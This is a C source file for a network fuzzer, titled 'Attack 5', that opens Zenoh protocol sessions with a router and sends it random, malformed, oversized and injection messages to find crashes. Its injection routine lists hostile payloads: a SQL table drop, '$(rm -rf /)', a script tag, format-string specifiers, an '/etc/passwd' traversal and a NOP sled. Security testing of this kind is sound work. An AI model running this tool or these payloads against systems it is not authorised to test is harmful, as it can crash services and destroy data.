/*
 * Attack 5: Protocol Fuzzer
 * Sends randomized/mutated protocol messages to find bugs
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <signal.h>
#include <time.h>

#define MAX_PACKET_SIZE 4096

#define Z_MSG_INIT 0x01
#define Z_MSG_OPEN 0x02
#define Z_FLAG_A 0x20       /* INIT/OPEN: ack */
#define Z_FLAG_S 0x40       /* INIT: size params present */
#define Z_FLAG_T 0x40       /* OPEN: lease in seconds */
#define Z_PROTO_VERSION 0x09
#define Z_WHATAMI_CLIENT 0x02
#define Z_ZID_LEN 16

static volatile int g_running = 1;

typedef enum {
    FUZZ_RANDOM,
    FUZZ_VALID_HEADER,
    FUZZ_MALFORMED,
    FUZZ_OVERFLOW,
    FUZZ_UNDERFLOW,
    FUZZ_INJECTION
} fuzz_strategy_t;

void signal_handler(int sig) {
    printf("\n[!] Stopping fuzzer...\n");
    g_running = 0;
}

static int send_all(int sock, const unsigned char *buf, size_t len) {
    while (len > 0) {
        ssize_t n = send(sock, buf, len, MSG_NOSIGNAL);
        if (n <= 0) return -1;
        buf += n;
        len -= n;
    }
    return 0;
}

static int recv_all(int sock, unsigned char *buf, size_t len) {
    while (len > 0) {
        ssize_t n = recv(sock, buf, len, 0);
        if (n <= 0) return -1;
        buf += n;
        len -= n;
    }
    return 0;
}

/* On TCP every batch is preceded by its length (2 bytes, little-endian). */
static int send_batch(int sock, const unsigned char *msg, size_t len) {
    unsigned char out[2 + MAX_PACKET_SIZE];
    if (len > sizeof(out) - 2) return -1;
    out[0] = len & 0xFF;
    out[1] = (len >> 8) & 0xFF;
    memcpy(out + 2, msg, len);
    return send_all(sock, out, len + 2);
}

static int recv_batch(int sock, unsigned char *buf, size_t cap) {
    unsigned char hdr[2];
    if (recv_all(sock, hdr, 2) < 0) return -1;
    size_t len = hdr[0] | (hdr[1] << 8);
    if (len == 0 || len > cap || recv_all(sock, buf, len) < 0) return -1;
    return (int)len;
}

static size_t encode_zint(unsigned char *buf, unsigned long long value) {
    size_t i = 0;
    while (value > 0x7F) {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

static int decode_zint(const unsigned char *buf, size_t len, size_t *off, unsigned long long *value) {
    *value = 0;
    for (int shift = 0; *off < len && shift < 64; shift += 7) {
        unsigned char b = buf[(*off)++];
        *value |= (unsigned long long)(b & 0x7F) << shift;
        if (!(b & 0x80)) return 0;
    }
    return -1;
}

/* InitSyn -> InitAck, OpenSyn(cookie) -> OpenAck: the router drops a link whose first message is not InitSyn. */
static int open_session(int sock) {
    unsigned char msg[2048], cookie[2048];
    size_t off = 0;
    unsigned long long cookie_len;
    int len;

    msg[off++] = Z_MSG_INIT;
    msg[off++] = Z_PROTO_VERSION;
    msg[off++] = ((Z_ZID_LEN - 1) << 4) | Z_WHATAMI_CLIENT;
    for (int i = 0; i < Z_ZID_LEN; i++) msg[off++] = rand() & 0xFF;
    msg[3] |= 0x01;  /* zid must not be zero */
    if (send_batch(sock, msg, off) < 0) return -1;

    len = recv_batch(sock, msg, sizeof(msg));
    if (len < 3 || (msg[0] & 0x1F) != Z_MSG_INIT || !(msg[0] & Z_FLAG_A)) return -1;
    off = 2;
    off += 1 + (msg[2] >> 4) + 1;
    if (msg[0] & Z_FLAG_S) off += 3;
    if (decode_zint(msg, len, &off, &cookie_len) < 0 || off + cookie_len > (size_t)len) return -1;
    memcpy(cookie, msg + off, cookie_len);

    off = 0;
    msg[off++] = Z_MSG_OPEN | Z_FLAG_T;
    off += encode_zint(msg + off, 10);  /* lease, seconds */
    off += encode_zint(msg + off, 0);   /* initial sn */
    off += encode_zint(msg + off, cookie_len);
    if (off + cookie_len > sizeof(msg)) return -1;
    memcpy(msg + off, cookie, cookie_len);
    off += cookie_len;
    if (send_batch(sock, msg, off) < 0) return -1;

    len = recv_batch(sock, msg, sizeof(msg));
    if (len < 1 || (msg[0] & 0x1F) != Z_MSG_OPEN || !(msg[0] & Z_FLAG_A)) return -1;
    return 0;
}

static int connect_session(struct sockaddr_in *target) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    struct timeval to = {1, 0};  /* a router that stops answering must not block the fuzzer */
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &to, sizeof(to));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &to, sizeof(to));
    if (connect(sock, (struct sockaddr*)target, sizeof(*target)) < 0 || open_session(sock) < 0) {
        int e = errno;
        close(sock);
        errno = e;
        return -1;
    }
    return sock;
}

void fuzz_random(unsigned char *buf, size_t *len) {
    *len = (rand() % MAX_PACKET_SIZE) + 1;
    for (size_t i = 0; i < *len; i++) {
        buf[i] = rand() % 256;
    }
}

void fuzz_valid_header(unsigned char *buf, size_t *len) {
    const unsigned char msg_types[] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06};
    buf[0] = msg_types[rand() % 7] | (rand() % 4) << 5;
    
    *len = 1 + (rand() % 1024);
    for (size_t i = 1; i < *len; i++) {
        buf[i] = rand() % 256;
    }
}

void fuzz_overflow(unsigned char *buf, size_t *len) {
    buf[0] = 0x05; // FRAME
    buf[1] = 0xFF; buf[2] = 0xFF; buf[3] = 0xFF; buf[4] = 0xFF; // Huge seq
    *len = MAX_PACKET_SIZE;
    memset(buf + 5, 0xAA, *len - 5);
}

void fuzz_underflow(unsigned char *buf, size_t *len) {
    buf[0] = rand() % 7;
    *len = 1; // Minimal message
}

void fuzz_injection(unsigned char *buf, size_t *len) {
    const char *payloads[] = {
        "'; DROP TABLE sessions; --",
        "$(rm -rf /)",
        "<script>alert('XSS')</script>",
        "\x00\x00\x00\x00\x00\x00\x00\x00",
        "%s%s%s%s%s%s%s%s",
        "../../../../etc/passwd",
        "\x90\x90\x90\x90\x90\x90\x90\x90" // NOP sled
    };
    
    buf[0] = 0x05; // FRAME
    buf[1] = 0x01; // Seq = 1
    
    const char *payload = payloads[rand() % 7];
    size_t payload_len = strlen(payload);
    memcpy(buf + 2, payload, payload_len);
    *len = 2 + payload_len;
}

/* Valid message id, but one field contradicts the rest of the message. */
void fuzz_malformed(unsigned char *buf, size_t *len) {
    size_t n = 0, extra = rand() % 16;
    switch (rand() % 4) {
        case 0: // KEEP_ALIVE ext whose declared length exceeds the bytes that follow
            buf[n++] = 0x84;                      // KEEP_ALIVE, Z: an extension follows
            buf[n++] = 0x42;                      // ext id 2, ZBuf body
            buf[n++] = extra + 1 + rand() % 100;  // declared length > extra
            for (size_t i = 0; i < extra; i++) buf[n++] = rand() % 256;
            break;
        case 1: // FRAME sn as a zint longer than the 9-byte maximum
            buf[n++] = 0x05;                      // FRAME
            buf[n++] = 0x80 | (rand() % 128);
            memset(buf + n, 0x80, 9);
            n += 9;
            buf[n++] = 0x00;
            break;
        case 2: // FRAME ext chain that announces one more extension and ends
            buf[n++] = 0x85;                      // FRAME, Z
            buf[n++] = rand() % 128;              // sn
            for (size_t i = 0; i <= extra % 3; i++) buf[n++] = 0x80 | (2 + rand() % 14);  // unit ext, Z set
            break;
        default: // FRAME ext with the reserved body encoding 0b11
            buf[n++] = 0x85;                      // FRAME, Z
            buf[n++] = rand() % 128;              // sn
            buf[n++] = 0x60 | (rand() % 16);
            for (size_t i = 0; i < extra; i++) buf[n++] = rand() % 256;
    }
    *len = n;
}

const char* strategy_name(fuzz_strategy_t strategy) {
    switch (strategy) {
        case FUZZ_RANDOM: return "Random";
        case FUZZ_VALID_HEADER: return "Valid Header";
        case FUZZ_MALFORMED: return "Malformed";
        case FUZZ_OVERFLOW: return "Overflow";
        case FUZZ_UNDERFLOW: return "Underflow";
        case FUZZ_INJECTION: return "Injection";
        default: return "Unknown";
    }
}

void fuzz_test(struct sockaddr_in *target, fuzz_strategy_t strategy,
               unsigned long *total, unsigned long *crashes) {
    unsigned char buffer[MAX_PACKET_SIZE];
    size_t len;
    
    switch (strategy) {
        case FUZZ_RANDOM: fuzz_random(buffer, &len); break;
        case FUZZ_VALID_HEADER: fuzz_valid_header(buffer, &len); break;
        case FUZZ_MALFORMED: fuzz_malformed(buffer, &len); break;
        case FUZZ_OVERFLOW: fuzz_overflow(buffer, &len); break;
        case FUZZ_UNDERFLOW: fuzz_underflow(buffer, &len); break;
        case FUZZ_INJECTION: fuzz_injection(buffer, &len); break;
        default: fuzz_random(buffer, &len);
    }
    
    /* One session per case: the router drops the session after a message it cannot decode. */
    errno = 0;
    int sock = connect_session(target);
    if (sock < 0) {
        printf("[!] Session not opened (%s) - possible crash?\n",
               errno ? strerror(errno) : "unexpected reply");
        (*crashes)++;
        return;
    }
    
    if (send_batch(sock, buffer, len) == 0) {
        (*total)++;
        
        // Try to receive response
        fd_set readfds;
        struct timeval tv = {0, 100000}; // 100ms timeout
        FD_ZERO(&readfds);
        FD_SET(sock, &readfds);
        
        if (select(sock + 1, &readfds, NULL, NULL, &tv) > 0) {
            unsigned char response[MAX_PACKET_SIZE];
            ssize_t recv_len = recv(sock, response, sizeof(response), 0);
            
            // Analyze response: EOF/reset, or a CLOSE (0x03) after the 2-byte length
            if (recv_len <= 0 || (recv_len >= 3 && (response[2] & 0x1F) == 0x03)) {
                printf("[!] Connection closed by peer\n");
            }
        }
    }
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <iterations>\n", argv[0]);
        fprintf(stderr, "Example: %s 127.0.0.1 7447 1000\n", argv[0]);
        return 1;
    }
    
    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    unsigned long iterations = atol(argv[3]);
    
    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Protocol Fuzzer                    ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Iterations: %lu\n", iterations);
    printf("[*] Strategies: 6\n\n");
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    struct sockaddr_in target_addr = {0};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target_addr.sin_addr);
    
    printf("[+] Fuzzer started\n\n");
    
    unsigned long total = 0;
    unsigned long crashes = 0;
    time_t start = time(NULL);
    
    for (unsigned long i = 0; i < iterations && g_running; i++) {
        fuzz_strategy_t strategy = rand() % 6;
        fuzz_test(&target_addr, strategy, &total, &crashes);
        
        if ((i + 1) % 100 == 0) {
            printf("[*] Progress: %lu/%lu | Strategy: %-15s | Crashes: %lu\n",
                   i + 1, iterations, strategy_name(strategy), crashes);
        }
        
        usleep(1000);
    }
    
    time_t duration = time(NULL) - start;
    
    printf("\n╔════════════════════════════════════════════╗\n");
    printf("║          Fuzzing Results                   ║\n");
    printf("╠════════════════════════════════════════════╣\n");
    printf("║ Total Tests:     %-25lu ║\n", total);
    printf("║ Potential Crashes: %-23lu ║\n", crashes);
    printf("║ Duration:        %-25ld ║\n", duration);
    if (duration > 0) {
        printf("║ Tests/sec:       %-25.2f ║\n", (double)total / duration);
    }
    printf("╚════════════════════════════════════════════╝\n");
    
    return 0;
}